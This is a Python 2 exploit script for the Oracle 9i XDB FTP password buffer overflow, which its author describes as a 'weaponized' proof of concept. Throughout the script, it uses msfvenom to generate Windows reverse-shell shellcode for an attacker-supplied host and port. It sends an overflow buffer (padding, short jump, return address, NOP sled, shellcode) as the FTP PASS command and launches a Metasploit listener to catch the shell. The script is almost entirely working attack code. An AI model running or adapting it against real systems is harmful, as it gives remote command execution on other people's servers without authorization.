#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ####################################################################################
#       ▄▄▄   ▄▄▄·  ▄▄· ▄▄▌  ▄▄▄ .▪  ▐▄• ▄ ·▄▄▄▄  ▄▄▄▄· ·▄▄▄▄▄▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▄   ▄▄· ▄▄▄ .#
#▪     ▀▄ █·▐█ ▀█ ▐█ ▌▪██•  ▀▄.▀·██  █▌█▌▪██▪ ██ ▐█ ▀█▪▐▄▄·•██  ▐█ ▄█▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ▀▄ █·▐█ ▌▪▀▄.▀· #
# ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██ ▄▄██▪  ▐▀▀▪▄▐█· ·██· ▐█· ▐█▌▐█▀▀█▄██▪  ▐█.▪ ██▀· ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▄ ██ ▄▄▐▀▀▪▄ #
#▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐███▌▐█▌▐▌▐█▄▄▌▐█▌▪▐█·█▌██. ██ ██▄▪▐███▌. ▐█▌·▐█▪·•▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█•█▌▐███▌▐█▄▄▌ #
# ▀█▄▀▪.▀  ▀ ▀  ▀ ·▀▀▀ .▀▀▀  ▀▀▀ ▀▀▀•▀▀ ▀▀▀▀▀▀▀• ·▀▀▀▀ ▀▀▀  ▀▀▀ .▀   .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀ .▀  ▀·▀▀▀  ▀▀▀  #
#                                                                                                           #
# oracle9i_xdb_ftp_pass_rce.py - nighter                                                                    #
#                                                                                                           #
# DATE                                                                                                      #
# 15/02/2019                                                                                                #
#                                                                                                           #
# DESCRIPTION                                                                                               #
# Exploits Oracle 9i XDB ftp password buffer overflow vulnerability                                         #
#   -> http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf                        #
#                                                                                                           #
# Note I have read several versions of this PoC and I have just weaponized it. So cannot take credz for the #
# b0f code                                                                                                  #
#                                                                                                           #
# nighter - http://nighter.se/                                                                              #
#                                                                                                           #
#############################################################################################################

import sys
import socket
import random
import string
import time
import os

from multiprocessing import Process


def build_shellcode():

    print("[+] Build shellcode")
    cmd = """msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s EXITFUNC=thread -a x86 --platform Windows -b "\\x00\\x09\\x0a\\x0d\\x20\\x22\\x25\\x26\\x27\\x2b\\x2f\\x3a\\x3c\\x3e\\x3f\\x40" -f raw -o /tmp/shellcode.bin 2>/dev/null""" % (LHOST, LPORT)
    os.system(cmd)

    if os.path.isfile('/tmp/shellcode.bin') is False:
        print("[-] Generate shellcode failed")
        sys.exit(0)


def exploit():

    # Give time to listener to start.
    time.sleep(5)

    rhost = HOST
    rport = int(PORT)

    build_shellcode()
    fp = open('/tmp/shellcode.bin', 'rb')
    shellprep = fp.read()
    fp.close()
    os.unlink('/tmp/shellcode.bin')

    ## Return addresses according to metasploit:
    ##   0x60616d46		oraclient9.dll (pop/pop/ret)
    ret = "\x46\x6d\x61\x60"

    nops = "\x90" *(800-308-7)			## to fill 800
    prependencoder = "\x81\xc4\xff\xef\xff\xff\x44"

    shellcode = ""
    shellcode += nops
    shellcode += prependencoder
    shellcode += shellprep

    user = "".join( [random.choice(string.uppercase) for i in xrange(10)] )				## 10 random uppercase characters

    passwd = "".join( [random.choice(string.uppercase) for i in xrange(442)] )			## 442 random uppercase characters
    jmp_short = "\xEB\x06"										## Short jump (\xEB) to an offset of 6 (\x06) according to metasploit (Rex::Arch::X86.jmp_short(6))
    two_nops = "\x90\x90"										## Two NOP's

    ## Let's build the exploit that is send as password
    buffer = passwd + jmp_short + two_nops + ret + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        print("[+] Run exploit")
        s.connect((rhost, rport))
        data = s.recv(1024)
        s.send('USER' + user +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print("[+] Done! Waiting for listener")
        s.close
    except:
        print("Could not connect to " + rhost + ":" + str(rport) + "!")


def start_listener():

    print("[+] Start listener")
    listener = "msfconsole -q -x 'use multi/handler;set PAYLOAD windows/shell/reverse_tcp;set LHOST %s;set LPORT %s;run'" % (LHOST, LPORT)
    os.system(listener)


if __name__ == '__main__':

    if len(sys.argv) != 4:
        print ("""
      ▄▄▄   ▄▄▄·  ▄▄· ▄▄▌  ▄▄▄ .▪  ▐▄• ▄ ·▄▄▄▄  ▄▄▄▄· ·▄▄▄▄▄▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄· .▄▄ · .▄▄ · ▄▄▄   ▄▄· ▄▄▄ .    
▪     ▀▄ █·▐█ ▀█ ▐█ ▌▪██•  ▀▄.▀·██  █▌█▌▪██▪ ██ ▐█ ▀█▪▐▄▄·•██  ▐█ ▄█▐█ ▄█▐█ ▀█ ▐█ ▀. ▐█ ▀. ▀▄ █·▐█ ▌▪▀▄.▀·    
 ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██ ▄▄██▪  ▐▀▀▪▄▐█· ·██· ▐█· ▐█▌▐█▀▀█▄██▪  ▐█.▪ ██▀· ██▀·▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐▀▀▄ ██ ▄▄▐▀▀▪▄    
▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐███▌▐█▌▐▌▐█▄▄▌▐█▌▪▐█·█▌██. ██ ██▄▪▐███▌. ▐█▌·▐█▪·•▐█▪·•▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█▐█•█▌▐███▌▐█▄▄▌    
 ▀█▄▀▪.▀  ▀ ▀  ▀ ·▀▀▀ .▀▀▀  ▀▀▀ ▀▀▀•▀▀ ▀▀▀▀▀▀▀• ·▀▀▀▀ ▀▀▀  ▀▀▀ .▀   .▀    ▀  ▀  ▀▀▀▀  ▀▀▀▀ .▀  ▀·▀▀▀  ▀▀▀     

    """)
        print("Usage: %s <HOST> <LHOST> <LPORT>" % (sys.argv[0]))
        print("EXAMPLE: ./oracle9i_xdb_ftp_pass_rce.py '10.10.10.70' 10.10.14.24 1337\n")
        sys.exit(0)

    HOST = sys.argv[1]
    if ':' in HOST:
        (HOST, PORT) = HOST.split(':')
    else:
        PORT = '2100'

    LHOST = sys.argv[2]
    LPORT = sys.argv[3]

    if os.path.isfile('/usr/bin/msfconsole') is False:
       print('[-] Please install metasploit for run this PoC.')
       sys.exit(1)

    # Run exploit Async
    p = Process(target=exploit)
    p.start()

    start_listener()

